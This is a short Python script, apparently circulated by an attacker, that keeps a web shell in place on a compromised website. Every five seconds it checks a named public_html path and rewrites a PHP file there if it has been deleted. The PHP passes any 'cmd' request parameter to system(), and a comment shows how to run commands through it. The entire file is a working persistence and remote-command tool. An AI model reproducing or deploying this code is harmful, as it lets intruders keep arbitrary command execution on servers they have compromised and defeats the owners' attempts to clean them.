# auto create shell when shell get delete
# coded by root@x-krypt0n-x
# thanks to warwer jeager cracken
import os
import time
import os.path

def main():
    while True:
        f = os.path.exists('/home/admin/web/vegansid.askwheel.com/public_html/500.php') # example # the path where you want to put the web shell
        
        if f == True:
            print("[*] file exists")
            pass
            time.sleep(5)
            
        else:
            print("[!] file not found")
            print("[!] creating file")
            # creating web shell 
            a = open('/home/admin/web/vegansid.askwheel.com/public_html/500.php','a') # example # the path where you want to put the web shell
            a.write('<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>') # u shell, example http://127.0.0.1/shell.php?cmd=ls -la (command)
            a.close()
            time.sleep(5)
main()